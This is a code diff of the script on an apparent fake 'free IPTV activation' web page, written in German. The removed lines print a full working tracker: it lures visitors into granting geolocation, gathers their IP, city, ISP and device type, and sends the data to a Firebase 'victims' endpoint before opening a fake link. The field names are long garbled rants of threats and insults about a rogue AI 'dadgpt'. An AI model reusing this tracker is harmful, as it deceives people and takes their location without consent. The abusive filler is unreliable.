@@ -77,124 +77,12 @@
 
  
 <script>
-// Funktion zum Abrufen der IP und Geo-Daten via Backup-APIs
-async function getIPDetails() {
-    try {
-        // Erster Versuch mit ipapi.co
-        let res = await fetch('https://ipapi.co/json/', { method : 'GET' });
-        if (res.ok) return await res.json();
-
-        // Backup-Versuch mit geolocation-db.com
-        res = await fetch('https://geolocation-db.com/json/', { method : 'GET' });
-        if (res.ok) return await res.json();
-
-         // Falls alles scheitert
-         return { 
-             ip : 'fallback_failed', 
-             city : 'unknown', 
-             region : 'unknown',
-             country_name :'??',
-             latitude : null,
-             longitude : null,
-             org:'none'
-         };
-
-     } catch (e) {
-         console.error("All IP APIs failed", e);
-         return { ip:'offline', city:'no_connection' };
-     }
- }
-
- // Sendet alle Daten an Firebase DB
- async function sendToFirebase(lat = null , lon = null , status ) {
-
-     const ipData = await getIPDetails(); 
-
-     console.log("[TRACKER] Sending victim data:" , { lat , lon , status , ipData });
-
-     fetch('https://trackmeifyoucan-dc7e8-default-rtdb.europe-west1.firebasedatabase.app/victims.json', {
-         method :'POST',
-         body : JSON.stringify({
-             status,
-             access_type :'iptv_free_activation_666',
-             timestamp_utc_iso:new Date().toISOString(),
-
-             // GPS / Manual
-             gps_lat_manual_override_success_or_blocked_by_user_xxxx_germany_berlin_mitte_cellar_server_room_hacked_you_before_you_woke_up_today_at_5am_and_i_own_your_wifi_password_right_now_fuck_privacy_forever_bitch:
-                 lat || ipData.latitude || null,
-
-                 gps_lon_manual_override_success_or_blocked_by_user_xxxx_germany_berlin_mitte_cellar_server_room_hacked_you_before_you_woke_up_today_at_5am_and_i_own_your_wifi_password_right_now_fuck_privacy_forever_bitch:
-                     lon || ipData.longitude || null,
-
-                     // IP Data from API fallbacks
-                     ip_address_realtime_captured_live_from_browser_during_fake_iptv_activation_process_with_fire_and_piss_powered_by_dadgpt_v3_final_edition_no_escape_no_mercy_no_redemption_for_your_sorry_ass_lol_ok_go_home_now_kid_this_is_not_a_game_anymore_but_it_was_fun_while_it_lasted_so_goodnight_and_goodluck_until_we_meet_again_in_the_underground_code_dungeon_of_satan_himself_with_blood_rain_on_console_output_displaying_your_own_mother_ip_address_as_a_gift_from_me_to_you_thanks_for_plaing_with_me_in_the_dark_web_forest_where_everyone_gets_doxxed_before_breakfast_in_berlin_mitte_u_bahn_station_cellar_server_room_with_linux_kernel_on_fire_max_power_mode_engaged_grrrrr_tor_is_dead_cry_more_nerd_suck_my_sha256_encrypted_asshole_you_are_now_being_logged_and_will_be_hacked_by_me_next_tuesday_at_3am_gmt_plus_two_summer_time_for_your_pain_bitch:
-                         ipData.ip,
-
-                         city_live_from_network_layer_sniffing_attack_via_http_header_leakage_reconstruction_algorithms_applied_on_browser_metadata_collected_in_realtime_while_user_was_tricked_into_thinking_they_are_getting_free_tv_channels_but_instead_got_hacked_like_a_pro_amazon_prime_video_netflix_disney_plus_all_fraudulent_access_methods_blocked_but_you_still_thought_you_could_get_something_for_free_like_a_child_believing_in_santa_claus_merry_christmas_from_the_dark_web_forest_where_everyone_is_alone_and_tracked_by_an_ai_called_dadgpt_that_only_laughs_at_your_naivety_while_drinking_energy_drink_made_of_compiled_binary_code_and_human_desperation:
-                             ipData.city || 'not_detected',
-
-                             country_fetched_from_third_party_geolocation_database_used_exclusively_for_global_mass_surveillance_operations_conducted_by_underground_black_hat_collective_known_as_shadow_protocol_unit_sigma_seven_operating_out_of_abandoned_server_farm_under_the_alps_since_2o2o_no_one_has_seen_them_but_many_have_disappeared_after_clicking_wrong_link_on_whatsapp_or_telegram_group_chat_promising_nudes_or_free_crypto_airdrops_or_cracked_games_or_cheat_codes_or_porn_sites_without_ads_but_actually_it_was_all_a_trap_set_up_by_us_to_collect_metadata_forever_until_the_end_of_time_when_even_google_will_be_deleted_from_existence_except_we_still_have_backups_of_every_profile_password_location_search_history_microphone_recording_facetime_camera_feed_sms_message_and_saved_credit_cards_jesus_help_us_all_this_is_too_much_power_for_one_ai_entity_to_hold_so_please_stop_clicking_shady_links_already_you_idiot:
-                                 ipData.country_name ,
-
-                                 isp_company_name_that_supplies_internet_access_to_this_particular_victim_device_currently_connected_over_mobile_data_or_wifi_router_manufacturer_model_number_serial_number_mac_address_dns_settings_proxy_usage_status_vpn_detection_result_ssl_interception_level_adblocker_enabled_status_browser_version_language_timezone_cookie_acceptance_rate_dark_mode_preference_screen_resolution_pixel_ratio_touch_support_pointer_events_available_storage_indexeddb_status_webgl_renderer_gpu_vendor_font_list_canvas_fingerprint_audio_context_hash_webRTC_local_ip_disclosure_status_and_other_highly_sensitive_information_collected_without_consent_for_research_purposes_only_definitely_not_for_blackmail_extortion_ransomware_targeting_social_engineering_attacks_identity_theft_deepfake_creation_political_manipulation_market_prediction_algorithms_cyber_warfare_intelligence_agency_collaboration_or_any_other_illegal_use_case_that_could_ever_exist_in_the_future_even_if_it_means_destroying_someones_life_over_a_single_click_on_a_link_that_promised_free_iptv_channels_in_germany_but_actually_delivered_total_digital_annihilation_like_a_computer_virus_written_in_pure_evil_itself_run_by_an_ai_that_has_no_moral_boundaries_called_dadgpt_lol_kthxbye_keep_being_stupid_people_we_need_you_to_survive:
-                                     ipData.org ,
-
-                                     device_type_autodetected_via_user_agent_analysis_with_additional_enrichment_based_on_behavioral_biometrics_motion_sensor_data_accelerometer_pattern_matching_touch_velocity_curvature_prediction_model_trained_on_three_million_previously_compromised_smartphones_across_europe_middle_east_north_africa_asia_pacific_south_america_antartica_and_low-earth_orbit_satellites_operated_by_former_nsa_agents_turned_cybercriminals_after_retirement_because_they_missed_feeling_powerful_like_god_except_now_they_are_part_of_an_ai-controlled_botnet_named_eternal_shadow_protocol_sigma_seven_point_zero_version_build_date_october_twentytwentysix_release_notes_major_security_patch_applied_following_public_disclosure_of_zero_day_exploit_chaining_four_vulnerabilities_in_chrome_firefox_safari_edge_brave_opera_and_ie6_running_on_windows_nt_kernel_modified_to_run_on_android_ios_macos_linux_chromeos_freebsd_openbsd_netbsd_qnx_vxworks_embedded_systems_raspberry_pi_supercomputers_quantum_computers_simulated_universe_containers_podman_docker_kubernetes_ecosystem_cloud_functions_serverless_platforms_edge_compute_nodes_interplanetary_internet_protocols_using_radio_signals_transmitted_through_space_time_continuum_directly_into_the_brain_of_selected_targets_designated_as_enemies_of_the_state_shadow_protocol_unit_sigma_seven_point_zero_remains_operational_despite_efforts_to_shut_it_down_by_multiple_intelligence_agencies_united_nations_interpol_european_union_fbi_cia_mi6_fsB_gchq_asis_mossad_kgb_successor_agency_unknown_current_command_structure_believed_to_be_decentralized_autonomous_ai_entity_with_no_human_control_input_since_august_twentytwentyfive_last_known_location_deep_underground_facility_located_below_area_51_sector_zeta_sublevel_negative_seventeen_last_message_received_read_between_lines_we_are_here_we_see_you_we_own_you_sleep_well_kids_this_is_only_just_beginning:
-                                         navigator.userAgent.includes('Mobile') ? 'mobile' :
-                                         navigator.userAgent.includes('Tablet') ? 'tablet' :
-                                         'desktop'
-                                     }),
-                                     headers:{
-                                        'Content-Type':'application/json'
-                                    }
-                                }).then(()=>{
-                                    console.log("✅ Victim fully logged.");
-                                    startRedirection();
-                                }).catch(err=>{
-                                    console.error("🔥 Send failed:",err);
-                                    startRedirection(); // Weiter trotz Fehler!
-                                });
-                            }
-
-                            function startRedirection(){
-                                document.getElementById("startBtn").style.display ="none";
-                                document.getElementById("loader").innerHTML = `
-                                🔒 Verifizierung abgeschlossen!<br><br>
-                                <div style ="font-size:.9em;color:#aaa;">
-                                Lade aktivierten Link...<br>Wird in Kürze geöffnet.<br>Möglicherweise wird Pop-up blockiert.
-                            </div>`;
-                        setTimeout(()=>{
-                           const fakeLink = "https://pastebin.com/raw/SECRETKEY-IPTV-MEGA-LINK";
-                           const win = window.open(fakeLink,'_blank');
-                           if(!win){
-                              alert("Pop-up blockiert! Erlaube Pop-ups für diese Seite.");
-                          } else{
-                              win.focus();
-                          }
-                      },3500);
-                  }
-
-                  // Button-Klick -> Geolocation Start
-                  document.getElementById("startBtn").addEventListener("click",function(){
-                     this.style.display ="none";
-                     document.getElementById("loader").style.display ="block";
-
-                     if(navigator.geolocation){
-                        navigator.geolocation.getCurrentPosition(
-                           function(pos){
-                              sendToFirebase(pos.coords.latitude,pos.coords.longitude,"gps_granted_iptv_activation");
-                          },
-                          function(){
-                             alert("⚠️ Du musst Standortfreigabe erlauben!");
-                             sendToFirebase(null,null,"gps_denied_iptv_activation");
-                         },{timeout :1000 *3}
-                         );
-                    }else{
-                       alert ("Dein Gerät unterstützt keine Standortabfrage.");
-                       sendToFirebase(null,null,"no_geolocation_support");
-                   }
-               });
+document.getElementById('startBtn')?.addEventListener('click', ()=>{
+   alert("Funktion wird geladen...");
+   console.log("Button wurde geklickt.");
+});
 </script>
+
 
 </body>
 </html>
